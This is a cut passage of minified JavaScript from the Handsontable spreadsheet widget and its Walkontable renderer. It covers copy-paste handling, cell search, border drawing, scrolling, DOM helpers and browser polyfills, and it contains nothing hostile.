n=(t.ctrlKey||t.metaKey)&&!t.altKey;if(t.keyCode==e.helper.keyCode.A&&n){setTimeout(e.helper.proxy(i.setCopyableText,i))}}this.copyPasteInstance=t.getInstance();this.copyPasteInstance.onCut(s);this.copyPasteInstance.onPaste(o);var i=this;r.addHook("beforeKeyDown",u);this.destroy=function(){this.copyPasteInstance.removeCallback(s);this.copyPasteInstance.removeCallback(o);this.copyPasteInstance.destroy();r.removeHook("beforeKeyDown",u)};r.addHook("afterDestroy",e.helper.proxy(this.destroy,this));this.triggerPaste=e.helper.proxy(this.copyPasteInstance.triggerPaste,this.copyPasteInstance);this.triggerCut=e.helper.proxy(this.copyPasteInstance.triggerCut,this.copyPasteInstance);this.setCopyableText=function(){var e=r.getSelected();var t=r.getSettings();var n=t.copyRowsLimit;var i=t.copyColsLimit;var s=Math.min(e[0],e[2]);var o=Math.min(e[1],e[3]);var u=Math.max(e[0],e[2]);var a=Math.max(e[1],e[3]);var f=Math.min(u,s+n-1);var l=Math.min(a,o+i-1);r.copyPaste.copyPasteInstance.copyable(r.getCopyableData(s,o,f,l));if(u!==f||a!==l){r.PluginHooks.run("afterCopyLimit",u-s+1,a-o+1,n,i)}}}function i(){var e=this;var t=e.getSettings().copyPaste!==false;if(t&&!e.copyPaste){e.copyPaste=new r(e)}else if(!t&&e.copyPaste){e.copyPaste.destroy();delete e.copyPaste}}e.PluginHooks.add("afterInit",i);e.PluginHooks.add("afterUpdateSettings",i)})(Handsontable,CopyPaste,SheetClip);(function(e){"use strict";function n(){var t=this;var n=!!t.getSettings().search;if(n){t.search=new e.Search(t)}else{delete t.search}}e.Search=function(n){this.query=function(t,r,i){var s=n.countRows();var o=n.countCols();var u=[];if(!r){r=e.Search.global.getDefaultCallback()}if(!i){i=e.Search.global.getDefaultQueryMethod()}for(var a=0;a<s;a++){for(var f=0;f<o;f++){var l=n.getDataAtCell(a,f);var c=n.getCellMeta(a,f);var h=c.search.callback||r;var p=c.search.queryMethod||i;var d=p(t,l);if(d){var v={row:a,col:f,data:l};u.push(v)}if(h){h(n,a,f,l,d)}}}return u}};e.Search.DEFAULT_CALLBACK=function(e,t,n,r,i){e.getCellMeta(t,n).isSearchResult=i};e.Search.DEFAULT_QUERY_METHOD=function(e,t){if(typeof e=="undefined"||e==null||!e.toLowerCase||e.length==0){return false}return t.toString().toLowerCase().indexOf(e.toLowerCase())!=-1};e.Search.DEFAULT_SEARCH_RESULT_CLASS="htSearchResult";e.Search.global=function(){var t=e.Search.DEFAULT_CALLBACK;var n=e.Search.DEFAULT_QUERY_METHOD;var r=e.Search.DEFAULT_SEARCH_RESULT_CLASS;return{getDefaultCallback:function(){return t},setDefaultCallback:function(e){t=e},getDefaultQueryMethod:function(){return n},setDefaultQueryMethod:function(e){n=e},getDefaultSearchResultClass:function(){return r},setDefaultSearchResultClass:function(e){r=e}}}();e.SearchCellDecorator=function(t,n,r,i,s,o,u){var a=typeof u.search=="object"&&u.search.searchResultClass||e.Search.global.getDefaultSearchResultClass();if(u.isSearchResult){e.Dom.addClass(n,a)}else{e.Dom.removeClass(n,a)}};var t=e.renderers.cellDecorator;e.renderers.cellDecorator=function(n,r,i,s,o,u,a){t.apply(this,arguments);e.SearchCellDecorator.apply(this,arguments)};e.PluginHooks.add("afterInit",n);e.PluginHooks.add("afterUpdateSettings",n)})(Handsontable);WalkontableOverlay.prototype.init=function(){this.TABLE=this.instance.wtTable.TABLE;this.fixed=this.instance.wtTable.hider;this.fixedContainer=this.instance.wtTable.holder;this.fixed.style.position="absolute";this.fixed.style.left="0";this.scrollHandler=this.getScrollableElement(this.TABLE);this.$scrollHandler=$(this.scrollHandler)};WalkontableOverlay.prototype.makeClone=function(e){var t=document.createElement("DIV");t.className="ht_clone_"+e+" handsontable";t.style.position="fixed";t.style.overflow="hidden";var n=document.createElement("TABLE");n.className=this.instance.wtTable.TABLE.className;t.appendChild(n);this.instance.wtTable.holder.parentNode.appendChild(t);return new Walkontable({cloneSource:this.instance,cloneOverlay:this,table:n})};WalkontableOverlay.prototype.getScrollableElement=function(e){var t=e.parentNode;while(t&&t.style){if(t.style.overflow!=="visible"&&t.style.overflow!==""){return t}if(this instanceof WalkontableHorizontalScrollbarNative&&t.style.overflowX!=="visible"&&t.style.overflowX!==""){return t}t=t.parentNode}return window};WalkontableOverlay.prototype.prepare=function(){};WalkontableOverlay.prototype.onScroll=function(e){this.windowScrollPosition=this.getScrollPosition();this.readSettings();if(e){this.windowScrollPosition=e}this.resetFixedPosition()};WalkontableOverlay.prototype.availableSize=function(){var e;if(this.windowScrollPosition>this.tableParentOffset){if(this.instance.wtTable.getLastVisibleRow()===this.total-1){e=this.instance.wtDom.outerHeight(this.TABLE)}else{e=this.windowSize}}else{e=this.windowSize-this.tableParentOffset}return e};WalkontableOverlay.prototype.refresh=function(e){var t=this.getLastCell();this.measureBefore=this.sumCellSizes(0,this.offset);if(t===-1){this.measureAfter=0}else{this.measureAfter=this.sumCellSizes(t,this.total-t)}this.applyToDOM();this.clone&&this.clone.draw(e)};WalkontableOverlay.prototype.destroy=function(){this.$scrollHandler.off("."+this.instance.guid);$(window).off("."+this.instance.guid);$(document).off("."+this.instance.guid)};WalkontableBorder.prototype.appear=function(e){var t,n,r,i,s,o,u,a,f,l,c,h;if(this.disabled){return}var p=this.instance,d,v,m,g,y=false,b=false,w=false,E=false,S,x,T;if(!p.wtTable.isRowInViewport(e[0])){y=true}if(!p.wtTable.isRowInViewport(e[2])){w=true}x=p.wtTable.rowStrategy.countVisible();for(S=0;S<x;S++){T=p.wtTable.rowFilter.visibleToSource(S);if(T>=e[0]&&T<=e[2]){d=T;break}}for(S=x-1;S>=0;S--){T=p.wtTable.rowFilter.visibleToSource(S);if(T>=e[0]&&T<=e[2]){m=T;break}}if(y&&w){b=true;E=true}else{if(!p.wtTable.isColumnInViewport(e[1])){b=true}if(!p.wtTable.isColumnInViewport(e[3])){E=true}x=p.wtTable.columnStrategy.countVisible();for(S=0;S<x;S++){T=p.wtTable.columnFilter.visibleToSource(S);if(T>=e[1]&&T<=e[3]){v=T;break}}for(S=x-1;S>=0;S--){T=p.wtTable.columnFilter.visibleToSource(S);if(T>=e[1]&&T<=e[3]){g=T;break}}}if(d!==void 0&&v!==void 0){t=d!==m||v!==g;n=p.wtTable.getCell([d,v]);r=t?p.wtTable.getCell([m,g]):n;i=this.wtDom.offset(n);s=t?this.wtDom.offset(r):i;o=this.wtDom.offset(p.wtTable.TABLE);a=i.top;c=s.top+this.wtDom.outerHeight(r)-a;l=i.left;h=s.left+this.wtDom.outerWidth(r)-l;u=a-o.top-1;f=l-o.left-1;var N=this.wtDom.getComputedStyle(n);if(parseInt(N["borderTopWidth"],10)>0){u+=1;c=c>0?c-1:0}if(parseInt(N["borderLeftWidth"],10)>0){f+=1;h=h>0?h-1:0}}else{this.disappear();return}if(y){this.topStyle.display="none"}else{this.topStyle.top=u+"px";this.topStyle.left=f+"px";this.topStyle.width=h+"px";this.topStyle.display="block"}if(b){this.leftStyle.display="none"}else{this.leftStyle.top=u+"px";this.leftStyle.left=f+"px";this.leftStyle.height=c+"px";this.leftStyle.display="block"}var C=Math.floor(this.settings.border.width/2);if(w){this.bottomStyle.display="none"}else{this.bottomStyle.top=u+c-C+"px";this.bottomStyle.left=f+"px";this.bottomStyle.width=h+"px";this.bottomStyle.display="block"}if(E){this.rightStyle.display="none"}else{this.rightStyle.top=u+"px";this.rightStyle.left=f+h-C+"px";this.rightStyle.height=c+1+"px";this.rightStyle.display="block"}if(w||E||!this.hasSetting(this.settings.border.cornerVisible)){this.cornerStyle.display="none"}else{this.cornerStyle.top=u+c-4+"px";this.cornerStyle.left=f+h-4+"px";this.cornerStyle.display="block"}};WalkontableBorder.prototype.disappear=function(){this.topStyle.display="none";this.leftStyle.display="none";this.bottomStyle.display="none";this.rightStyle.display="none";this.cornerStyle.display="none"};WalkontableBorder.prototype.hasSetting=function(e){if(typeof e==="function"){return e()}return!!e};WalkontableCellFilter.prototype.source=function(e){return e};WalkontableCellFilter.prototype.offsetted=function(e){return e+this.offset};WalkontableCellFilter.prototype.unOffsetted=function(e){return e-this.offset};WalkontableCellFilter.prototype.fixed=function(e){if(e<this.fixedCount){return e-this.offset}else{return e}};WalkontableCellFilter.prototype.unFixed=function(e){if(e<this.fixedCount){return e+this.offset}else{return e}};WalkontableCellFilter.prototype.visibleToSource=function(e){return this.source(this.offsetted(this.fixed(e)))};WalkontableCellFilter.prototype.sourceToVisible=function(e){return this.source(this.unOffsetted(this.unFixed(e)))};WalkontableCellStrategy.prototype.getSize=function(e){return this.cellSizes[e]};WalkontableCellStrategy.prototype.getContainerSize=function(e){return typeof this.containerSizeFn==="function"?this.containerSizeFn(e):this.containerSizeFn};WalkontableCellStrategy.prototype.countVisible=function(){return this.cellCount};WalkontableCellStrategy.prototype.isLastIncomplete=function(){if(this.instance.getSetting("nativeScrollbars")){var e=this.instance.cloneFrom?this.instance.cloneFrom.wtScrollbars.vertical:this.instance.wtScrollbars.vertical;return this.remainingSize>e.sumCellSizes(e.offset,e.offset+e.curOuts+1)}else{return this.remainingSize>0}};WalkontableClassNameCache.prototype.add=function(e,t,n){if(!this.cache[e]){this.cache[e]=[]}if(!this.cache[e][t]){this.cache[e][t]=[]}this.cache[e][t][n]=true};WalkontableClassNameCache.prototype.test=function(e,t,n){return this.cache[e]&&this.cache[e][t]&&this.cache[e][t][n]};WalkontableColumnFilter.prototype=new WalkontableCellFilter;WalkontableColumnFilter.prototype.readSettings=function(e){this.offset=e.wtSettings.settings.offsetColumn;this.total=e.getSetting("totalColumns");this.fixedCount=e.getSetting("fixedColumnsLeft");this.countTH=e.getSetting("rowHeaders").length};WalkontableColumnFilter.prototype.offsettedTH=function(e){return e-this.countTH};WalkontableColumnFilter.prototype.unOffsettedTH=function(e){return e+this.countTH};WalkontableColumnFilter.prototype.visibleRowHeadedColumnToSourceColumn=function(e){return this.visibleToSource(this.offsettedTH(e))};WalkontableColumnFilter.prototype.sourceColumnToVisibleRowHeadedColumn=function(e){return this.unOffsettedTH(this.sourceToVisible(e))};WalkontableColumnStrategy.prototype=new WalkontableCellStrategy;WalkontableColumnStrategy.prototype.getSize=function(e){return this.cellSizes[e]+(this.cellStretch[e]||0)};WalkontableColumnStrategy.prototype.stretch=function(){var e=this.getContainerSize(this.cellSizesSum),t=0;this.remainingSize=this.cellSizesSum-e;this.cellStretch.length=0;if(this.strategy==="all"){if(this.remainingSize<0){var n=e/this.cellSizesSum;var r;while(t<this.cellCount-1){r=Math.floor(n*this.cellSizes[t]);this.remainingSize+=r-this.cellSizes[t];this.cellStretch[t]=r-this.cellSizes[t];t++}this.cellStretch[this.cellCount-1]=-this.remainingSize;this.remainingSize=0}}else if(this.strategy==="last"){if(this.remainingSize<0&&e!==Infinity){this.cellStretch[this.cellCount-1]=-this.remainingSize;this.remainingSize=0}}};Walkontable.prototype.draw=function(e){this.drawInterrupted=false;if(!e&&!this.wtDom.isVisible(this.wtTable.TABLE)){this.drawInterrupted=true;return}this.getSetting("beforeDraw",!e);e=e&&this.getSetting("offsetRow")===this.lastOffsetRow&&this.getSetting("offsetColumn")===this.lastOffsetColumn;if(this.drawn){this.scrollVertical(0);this.scrollHorizontal(0)}this.lastOffsetRow=this.getSetting("offsetRow");this.lastOffsetColumn=this.getSetting("offsetColumn");this.wtTable.draw(e);if(!this.cloneSource){this.getSetting("onDraw",!e)}return this};Walkontable.prototype.update=function(e,t){return this.wtSettings.update(e,t)};Walkontable.prototype.scrollVertical=function(e){var t=this.wtScroll.scrollVertical(e);this.getSetting("onScrollVertically");return t};Walkontable.prototype.scrollHorizontal=function(e){var t=this.wtScroll.scrollHorizontal(e);this.getSetting("onScrollHorizontally");return t};Walkontable.prototype.scrollViewport=function(e){this.wtScroll.scrollViewport(e);return this};Walkontable.prototype.getViewport=function(){return[this.wtTable.rowFilter.visibleToSource(0),this.wtTable.columnFilter.visibleToSource(0),this.wtTable.getLastVisibleRow(),this.wtTable.getLastVisibleColumn()]};Walkontable.prototype.getSetting=function(e,t,n,r){return this.wtSettings.getSetting(e,t,n,r)};Walkontable.prototype.hasSetting=function(e){return this.wtSettings.has(e)};Walkontable.prototype.destroy=function(){$(document.body).off("."+this.guid);this.wtScrollbars.destroy();clearTimeout(this.wheelTimeout);this.wtEvent&&this.wtEvent.destroy()};WalkontableDebugOverlay.prototype=new WalkontableOverlay;WalkontableDebugOverlay.prototype.resetFixedPosition=function(){if(!this.instance.wtTable.holder.parentNode){return}var e=this.clone.wtTable.holder.parentNode;var t=this.instance.wtTable.holder.getBoundingClientRect();e.style.top=Math.ceil(t.top,10)+"px";e.style.left=Math.ceil(t.left,10)+"px"};WalkontableDebugOverlay.prototype.prepare=function(){};WalkontableDebugOverlay.prototype.refresh=function(e){this.clone&&this.clone.draw(e)};WalkontableDebugOverlay.prototype.getScrollPosition=function(){};WalkontableDebugOverlay.prototype.getLastCell=function(){};WalkontableDebugOverlay.prototype.applyToDOM=function(){};WalkontableDebugOverlay.prototype.scrollTo=function(){};WalkontableDebugOverlay.prototype.readWindowSize=function(){};WalkontableDebugOverlay.prototype.readSettings=function(){};WalkontableDom.prototype.closest=function(e,t,n){while(e!=null&&e!==n){if(e.nodeType===1&&t.indexOf(e.nodeName)>-1){return e}e=e.parentNode}return null};WalkontableDom.prototype.isChildOf=function(e,t){var n=e.parentNode;while(n!=null){if(n==t){return true}n=n.parentNode}return false};WalkontableDom.prototype.index=function(e){var t=0;while(e=e.previousSibling){++t}return t};if(document.documentElement.classList){WalkontableDom.prototype.hasClass=function(e,t){return e.classList.contains(t)};WalkontableDom.prototype.addClass=function(e,t){if(e)e.classList.add(t)};WalkontableDom.prototype.removeClass=function(e,t){if(e)e.classList.remove(t)}}else{WalkontableDom.prototype.hasClass=function(e,t){return e.className.match(new RegExp("(\\s|^)"+t+"(\\s|$)"))};WalkontableDom.prototype.addClass=function(e,t){if(!this.hasClass(e,t))e.className+=" "+t};WalkontableDom.prototype.removeClass=function(e,t){if(this.hasClass(e,t)){var n=new RegExp("(\\s|^)"+t+"(\\s|$)");e.className=e.className.replace(n," ").trim()}}}WalkontableDom.prototype.removeTextNodes=function(e,t){if(e.nodeType===3){t.removeChild(e)}else if(["TABLE","THEAD","TBODY","TFOOT","TR"].indexOf(e.nodeName)>-1){var n=e.childNodes;for(var r=n.length-1;r>=0;r--){this.removeTextNodes(n[r],e)}}};WalkontableDom.prototype.empty=function(e){var t;while(t=e.lastChild){e.removeChild(t)}};WalkontableDom.prototype.HTML_CHARACTERS=/(<(.*)>|&(.*);)/;WalkontableDom.prototype.fastInnerHTML=function(e,t){if(this.HTML_CHARACTERS.test(t)){e.innerHTML=t}else{this.fastInnerText(e,t)}};if(document.createTextNode("test").textContent){WalkontableDom.prototype.fastInnerText=function(e,t){var n=e.firstChild;if(n&&n.nodeType===3&&n.nextSibling===null){n.textContent=t}else{this.empty(e);e.appendChild(document.createTextNode(t))}}}else{WalkontableDom.prototype.fastInnerText=function(e,t){var n=e.firstChild;if(n&&n.nodeType===3&&n.nextSibling===null){n.data=t}else{this.empty(e);e.appendChild(document.createTextNode(t))}}}WalkontableDom.prototype.isVisible=function(e){var t=e;while(t!==document.documentElement){if(t===null){return false}else if(t.nodeType===11){if(t.host){if(t.host.impl){return WalkontableDom.prototype.isVisible(t.host.impl)}else if(t.host){return WalkontableDom.prototype.isVisible(t.host)}else{throw new Error("Lost in Web Components world")}}else{return false}}else if(t.style.display==="none"){return false}t=t.parentNode}return true};WalkontableDom.prototype.offset=function(e){if(this.hasCaptionProblem()&&e.firstChild&&e.firstChild.nodeName==="CAPTION"){var t=e.getBoundingClientRect();return{top:t.top+(window.pageYOffset||document.documentElement.scrollTop)-(document.documentElement.clientTop||0),left:t.left+(window.pageXOffset||document.documentElement.scrollLeft)-(document.documentElement.clientLeft||0)}}var n=e.offsetLeft,r=e.offsetTop,i=e;while(e=e.offsetParent){if(e===document.body){break}n+=e.offsetLeft;r+=e.offsetTop;i=e}if(i&&i.style.position==="fixed"){n+=window.pageXOffset||document.documentElement.scrollLeft;r+=window.pageYOffset||document.documentElement.scrollTop}return{left:n,top:r}};WalkontableDom.prototype.getComputedStyle=function(e){return e.currentStyle||document.defaultView.getComputedStyle(e)};WalkontableDom.prototype.outerWidth=function(e){return e.offsetWidth};WalkontableDom.prototype.outerHeight=function(e){if(this.hasCaptionProblem()&&e.firstChild&&e.firstChild.nodeName==="CAPTION"){return e.offsetHeight+e.firstChild.offsetHeight}else{return e.offsetHeight}};(function(){function t(){var t=document.createElement("TABLE");t.style.borderSpacing=0;t.style.borderWidth=0;t.style.padding=0;var n=document.createElement("TBODY");t.appendChild(n);n.appendChild(document.createElement("TR"));n.firstChild.appendChild(document.createElement("TD"));n.firstChild.firstChild.innerHTML="<tr><td>t<br>t</td></tr>";var r=document.createElement("CAPTION");r.innerHTML="c<br>c<br>c<br>c";r.style.padding=0;r.style.margin=0;t.insertBefore(r,n);document.body.appendChild(t);e=t.offsetHeight<2*t.lastChild.offsetHeight;document.body.removeChild(t)}function r(){var e=document.createElement("p");e.style.width="100%";e.style.height="200px";var t=document.createElement("div");t.style.position="absolute";t.style.top="0px";t.style.left="0px";t.style.visibility="hidden";t.style.width="200px";t.style.height="150px";t.style.overflow="hidden";t.appendChild(e);(document.body||document.documentElement).appendChild(t);var n=e.offsetWidth;t.style.overflow="scroll";var r=e.offsetWidth;if(n==r)r=t.clientWidth;(document.body||document.documentElement).removeChild(t);return n-r}var e;WalkontableDom.prototype.hasCaptionProblem=function(){if(e===void 0){t()}return e};WalkontableDom.prototype.getCaretPosition=function(e){if(e.selectionStart){return e.selectionStart}else if(document.selection){e.focus();var t=document.selection.createRange();if(t==null){return 0}var n=e.createTextRange(),r=n.duplicate();n.moveToBookmark(t.getBookmark());r.setEndPoint("EndToStart",n);return r.text.length}return 0};WalkontableDom.prototype.setCaretPosition=function(e,t,n){if(n===void 0){n=t}if(e.setSelectionRange){e.focus();e.setSelectionRange(t,n)}else if(e.createTextRange){var r=e.createTextRange();r.collapse(true);r.moveEnd("character",n);r.moveStart("character",t);r.select()}};var n;WalkontableDom.prototype.getScrollbarWidth=function(){if(n===void 0){n=r()}return n}})();WalkontableEvent.prototype.parentCell=function(e){var t={};var n=this.instance.wtTable.TABLE;var r=this.wtDom.closest(e,["TD","TH"],n);if(r&&this.wtDom.isChildOf(r,n)){t.coords=this.instance.wtTable.getCoords(r);t.TD=r}else if(this.wtDom.hasClass(e,"wtBorder")&&this.wtDom.hasClass(e,"current")){t.coords=this.instance.selections.current.selected[0];t.TD=this.instance.wtTable.getCell(t.coords)}return t};WalkontableEvent.prototype.destroy=function(){clearTimeout(this.dblClickTimeout0);clearTimeout(this.dblClickTimeout1)};window.requestAnimFrame=function(){return window.requestAnimationFrame||window.webkitRequestAnimationFrame||window.mozRequestAnimationFrame||window.oRequestAnimationFrame||window.msRequestAnimationFrame||function(e,t){return window.setTimeout(e,1e3/60)}}();window.cancelRequestAnimFrame=function(){return window.cancelAnimationFrame||window.webkitCancelRequestAnimationFrame||window.mozCancelRequestAnimationFrame||window.oCancelRequestAnimationFrame||window.msCancelRequestAnimationFrame||clearTimeout}();if(!window.getComputedStyle){(function(){var e;var t={getPropertyValue:function(n){if(n=="float")n="styleFloat";return e.currentStyle[n.toUpperCase()]||null}};window.getComputedStyle=function(n){e=n;return t}})()}if(!String.prototype.trim){var trimRegex=/^\s+|\s+$/g;String.prototype.trim=function(){return this.replace(trimRegex,"")}}WalkontableRowFilter.prototype=new WalkontableCellFilter;WalkontableRowFilter.prototype.readSettings=function(e){if(e.cloneOverlay instanceof WalkontableDebugOverlay){this.offset=0}else{this.offset=e.wtSettings.settings.offsetRow}this.total=e.getSetting("totalRows");this.fixedCount=e.getSetting("fixedRowsTop")};WalkontableRowStrategy.prototype=new WalkontableCellStrategy;WalkontableRowStrategy.prototype.add=function(e,t,n){if(!this.isLastIncomplete()&&this.remainingSize!=0){var r=this.sizeAtIndex(e,t);if(r===void 0){return false}var i=this.getContainerSize(this.cellSizesSum+r);if(n){this.cellSizes.unshift(r)}else{this.cellSizes.push(r)}this.cellSizesSum+=r;this.cellCount++;this.remainingSize=this.cellSizesSum-i;if(n&&this.isLastIncomplete()){return false}return true}return false};WalkontableRowStrategy.prototype.remove=function(){var e=this.cellSizes.pop();this.cellSizesSum-=e;this.cellCount--;this.remainingSize-=e};WalkontableRowStrategy.prototype.removeOutstanding=function(){while(this.cellCount>0&&this.cellSizes[this.cellCount-1]<this.remainingSize){this.remove()}};WalkontableScroll.prototype.scrollVertical=function(e){if(!this.instance.drawn){throw new Error("scrollVertical can only be called after table was drawn to DOM")}var t=this.instance,n,r=t.getSetting("offsetRow"),i=t.getSetting("fixedRowsTop"),s=t.getSetting("totalRows"),o=t.wtViewport.getViewportHeight();if(s>0){n=this.scrollLogicVertical(e,r,s,i,o,function(e){if(e-r<i&&e-r>=0){return t.getSetting("rowHeight",e-r)}else{return t.getSetting("rowHeight",e)}},function(e){t.wtTable.verticalRenderReverse=e})}else{n=0}if(n!==r){this.instance.wtScrollbars.vertical.scrollTo(n)}return t};WalkontableScroll.prototype.scrollHorizontal=function(e){if(!this.instance.drawn){throw new Error("scrollHorizontal can only be called after table was drawn to DOM")}var t=this.instance,n,r=t.getSetting("offsetColumn"),i=t.getSetting("fixedColumnsLeft"),s=t.getSetting("totalColumns"),o=t.wtViewport.getViewportWidth();if(s>0){n=this.scrollLogicHorizontal(e,r,s,i,o,function(e){if(e-r<i&&e-r>=0){return t.getSetting("columnWidth",e-r)}else{return t.getSetting("columnWidth",e)}})}else{n=0}if(n!==r){this.instance.wtScrollbars.horizontal.scrollTo(n)}return t};WalkontableScroll.prototype.scrollLogicVertical=function(e,t,n,r,i,s,o){var u=t+e;if(u>=n-r){u=n-r-1;o(true)}if(u<0){u=0}return u};WalkontableScroll.prototype.scrollLogicHorizontal=function(e,t,n,r,i,s){var o=t+e,u=0,a;if(o>r){if(o>=n-r){o=n-r-1}a=o;while(u<i&&a<n){u+=s(a);a++}if(u<i){while(o>0){u+=s(o-1);if(u<i){o--}else{break}}}}else if(o<0){o=0}return o};WalkontableScroll.prototype.scrollViewport=function(e){if(!this.instance.drawn){return}var t=this.instance.getSetting("offsetRow"),n=this.instance.getSetting("offsetColumn"),r=this.instance.wtTable.getLastVisibleRow(),i=this.instance.getSetting("totalRows"),s=this.instance.getSetting("totalColumns"),o=this.instance.getSetting("fixedRowsTop"),u=this.instance.getSetting("fixedColumnsLeft");if(this.instance.getSetting("nativeScrollbars")){var a=this.instance.wtTable.getCell(e);if(typeof a==="object"){var f=WalkontableDom.prototype.offset(a);var l=WalkontableDom.prototype.outerWidth(a);var c=WalkontableDom.prototype.outerHeight(a);var h=this.instance.wtScrollbars.horizontal.getScrollPosition();var p=this.instance.wtScrollbars.vertical.getScrollPosition();var d=WalkontableDom.prototype.outerWidth(this.instance.wtScrollbars.horizontal.scrollHandler);var v=WalkontableDom.prototype.outerHeight(this.instance.wtScrollbars.vertical.scrollHandler);if(this.instance.wtScrollbars.horizontal.scrollHandler!==window){f.left=f.left-WalkontableDom.prototype.offset(this.instance.wtScrollbars.horizontal.scrollHandler).left}if(this.instance.wtScrollbars.vertical.scrollHandler!==window){f.top=f.top-WalkontableDom.prototype.offset(this.instance.wtScrollbars.vertical.scrollHandler).top}d-=20;v-=20;if(l<d){if(f.left<h){this.instance.wtScrollbars.horizontal.setScrollPosition(f.left)}else if(f.left+l>h+d){this.instance.wtScrollbars.horizontal.setScrollPosition(f.left-d+l)}}if(c<v){if(f.top<p){this.instance.wtScrollbars.vertical.setScrollPosition(f.top)}else if(f.top+c>p+v){this.instance.wtScrollbars.vertical.setScrollPosition(f.top-v+c)}}return}}if(e[0]<0||e[0]>i-1){throw new Error("row "+e[0]+" does not exist")}else if(e[1]<0||e[1]>s-1){throw new Error("column "+e[1]+" does not exist")}if(e[0]>r){this.scrollVertical(e[0]-o-t);this.instance.wtTable.verticalRenderReverse=true}else if(e[0]===r&&this.instance.wtTable.rowStrategy.isLastIncomplete()){this.scrollVertical(e[0]-o-t);this.instance.wtTable.verticalRenderReverse=true}else if(e[0]-o<t){this.scrollVertical(e[0]-o-t)}else{this.scrollVertical(0)}if(this.instance.wtTable.isColumnBeforeViewport(e[1])){this.instance.wtScrollbars.horizontal.scrollTo(e[1]-u)}else if(this.instance.wtTable.isColumnAfterViewport(e[1])||this.instance.wtTable.getLastVisibleColumn()===e[1]&&!this.instance.wtTable.isLastColumnFullyVisible()){var m=0;for(var g=0;g<u;g++){m+=this.instance.getSetting("columnWidth",g)}var y=e[1];m+=this.instance.getSetting("columnWidth",y);var b=this.instance.wtViewport.getViewportWidth();if(m<b){var w=this.instance.getSetting("columnWidth",y-1);while(m+w<=b&&y>=u){y--;m+=w;w=this.instance.getSetting("columnWidth",y-1)}}this.instance.wtScrollbars.horizontal.scrollTo(y-u)}return this.instance};WalkontableScrollbar.prototype.init=function(){var e=this;this.$table=$(this.instance.wtTable.TABLE);this.slider=document.createElement("DIV");this.sliderStyle=this.slider.style;this.sliderStyle.position="absolute";this.sliderStyle.top="0";this.sliderStyle.left="0";this.sliderStyle.display="none";this.slider.className="dragdealer "+this.type;this.handle=document.createElement("DIV");this.handleStyle=this.handle.style;this.handle.className="handle";this.slider.appendChild(this.handle);this.container=this.instance.wtTable.holder;this.container.appendChild(this.slider);var t=true;this.dragTimeout=null;var n;var r=function(){e.onScroll(n)};this.dragdealer=new Dragdealer(this.slider,{vertical:this.type==="vertical",horizontal:this.type==="horizontal",slide:false,speed:100,animationCallback:function(i,s){if(t){t=false;return}e.skipRefresh=true;n=e.type==="vertical"?s:i;if(e.dragTimeout===null){e.dragTimeout=setInterval(r,100);r()}},callback:function(t,r){e.skipRefresh=false;clearInterval(e.dragTimeout);e.dragTimeout=null;n=e.type==="vertical"?r:t;e.onScroll(n)}});this.skipRefresh=false};WalkontableScrollbar.prototype.onScroll=function(e){if(this.instance.drawn){this.readSettings();if(this.total>this.visibleCount){var t=Math.round(this.handlePosition*this.total/this.sliderSize);if(e===1){if(this.type==="vertical"){this.instance.scrollVertical(Infinity).draw()}else{this.instance.scrollHorizontal(Infinity).draw()}}else if(t!==this.offset){if(this.type==="vertical"){this.instance.scrollVertical(t-this.offset).draw()}else{this.instance.scrollHorizontal(t-this.offset).draw()}}else{this.refresh()}}}};WalkontableScrollbar.prototype.getHandleSizeRatio=function(e,t){if(!t||e>t||e==t){return 1}return 1/t};WalkontableScrollbar.prototype.prepare=function(){if(this.skipRefresh){return}var e=this.getHandleSizeRatio(this.visibleCount,this.total);if((e===1||isNaN(e))&&this.scrollMode==="auto"||this.scrollMode==="none"){this.visible=false}else{this.visible=true}};WalkontableScrollbar.prototype.refresh=function(){if(this.skipRefresh){return}else if(!this.visible){this.sliderStyle.display="none";return}var e,t,n,r,i=this.visibleCount,s=this.instance.wtViewport.getWorkspaceWidth(),o=this.instance.wtViewport.getWorkspaceHeight();if(s===Infinity){s=this.instance.wtViewport.getWorkspaceActualWidth()}if(o===Infinity){o=this.instance.wtViewport.getWorkspaceActualHeight()}if(this.type==="vertical"){if(this.instance.wtTable.rowStrategy.isLastIncomplete()){i--}t=o-2;this.sliderStyle.top=this.instance.wtDom.offset(this.$table[0]).top-this.instance.wtDom.offset(this.container).top+"px";this.sliderStyle.left=s-1+"px";this.sliderStyle.height=Math.max(t,0)+"px"}else{t=s-2;this.sliderStyle.left=this.instance.wtDom.offset(this.$table[0]).left-this.instance.wtDom.offset(this.container).left+"px";this.sliderStyle.top=o-1+"px";this.sliderStyle.width=Math.max(t,0)+"px"}e=this.getHandleSizeRatio(i,this.total);n=Math.round(t*e);if(n<10){n=15}r=Math.floor(t*(this.offset/this.total));if(n+r>t){r=t-n}if(this.type==="vertical"){this.handleStyle.height=n+"px";this.handleStyle.top=r+"px"}else{this.handleStyle.width=n+"px";this.handleStyle.left=r+"px"}this.sliderStyle.display="block"};WalkontableScrollbar.prototype.destroy=function(){clearInterval(this.dragdealer.interval)};var WalkontableVerticalScrollbar=function(e){this.instance=e;this.type="vertical";this.init()};WalkontableVerticalScrollbar.prototype=new WalkontableScrollbar;WalkontableVerticalScrollbar.prototype.scrollTo=function(e){this.instance.update("offsetRow",e)};WalkontableVerticalScrollbar.prototype.readSettings=function(){this.scrollMode=this.instance.getSetting("scrollV");this.offset=this.instance.getSetting("offsetRow");this.total=this.instance.getSetting("totalRows");this.visibleCount=this.instance.wtTable.rowStrategy.countVisible();if(this.visibleCount>1&&this.instance.wtTable.rowStrategy.isLastIncomplete()){this.visibleCount--}this.handlePosition=parseInt(this.handleStyle.top,10);this.sliderSize=parseInt(this.sliderStyle.height,10);this.fixedCount=this.instance.getSetting("fixedRowsTop")};var WalkontableHorizontalScrollbar=function(e){this.instance=e;this.type="horizontal";this.init()};WalkontableHorizontalScrollbar.prototype=new WalkontableScrollbar;WalkontableHorizontalScrollbar.prototype.scrollTo=function(e){this.instance.update("offsetColumn",e)};WalkontableHorizontalScrollbar.prototype.readSettings=function(){this.scrollMode=this.instance.getSetting("scrollH");this.offset=this.instance.getSetting("offsetColumn");this.total=this.instance.getSetting("totalColumns");this.visibleCount=this.instance.wtTable.columnStrategy.countVisible();if(this.visibleCount>1&&this.instance.wtTable.columnStrategy.isLastIncomplete()){this.visibleCount--}this.handlePosition=parseInt(this.handleStyle.left,10);this.sliderSize=parseInt(this.sliderStyle.width,10);this.fixedCount=this.instance.getSetting("fixedColumnsLeft")};WalkontableHorizontalScrollbar.prototype.getHandleSizeRatio=function(e,t){if(!t||e>t||e==t){return 1}return e/t};WalkontableCornerScrollbarNative.prototype=new 